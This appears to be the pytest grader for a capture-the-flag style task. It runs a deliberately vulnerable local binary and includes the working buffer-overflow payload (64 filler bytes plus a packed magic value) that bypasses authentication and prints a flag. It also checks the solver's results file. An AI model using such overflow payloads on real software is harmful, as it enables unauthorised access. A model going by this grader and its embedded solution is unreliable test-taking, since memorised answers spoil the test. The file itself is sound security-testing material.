import re
import struct
import subprocess
from pathlib import Path


BINARY = Path("/app/vulnerable")
RESULTS = Path("/app/results.txt")
MAGIC = 0x51A7C0DE


def run_binary(payload: bytes) -> subprocess.CompletedProcess[bytes]:
    return subprocess.run([BINARY], input=payload, capture_output=True, timeout=5)


def exploit_output() -> bytes:
    run = run_binary(b"A" * 64 + struct.pack("<I", MAGIC))
    assert run.returncode == 0
    return run.stdout


def extracted_secret() -> str:
    match = re.search(rb"Secret:\s*(FLAG\{[^}\r\n]+})", exploit_output())
    assert match is not None
    return match.group(1).decode()


def test_results_file_exists_and_is_single_line():
    assert RESULTS.is_file()
    lines = RESULTS.read_text().splitlines()
    assert len(lines) == 1
    assert lines[0]


def test_result_has_flag_format():
    assert re.fullmatch(r"FLAG\{[^}\r\n]+}", RESULTS.read_text().strip())


def test_benign_input_does_not_reveal_secret():
    output = run_binary(b"A" * 64).stdout
    assert b"FLAG{" not in output
    assert b"authorization unchanged" in output


def test_wrong_adjacent_value_does_not_open_gate():
    output = run_binary(b"A" * 64 + struct.pack("<I", 1)).stdout
    assert b"FLAG{" not in output
    assert b"Authentication bypassed" not in output


def test_overwrite_trigger_reaches_protected_path():
    output = exploit_output()
    assert b"Authentication bypassed" in output
    assert re.search(rb"Secret:\s*FLAG\{[^}\r\n]+}", output)


def test_result_matches_secret_emitted_by_trigger():
    assert RESULTS.read_text().strip() == extracted_secret()


def test_plaintext_result_is_not_stored_in_binary():
    assert RESULTS.read_text().strip().encode() not in BINARY.read_bytes()
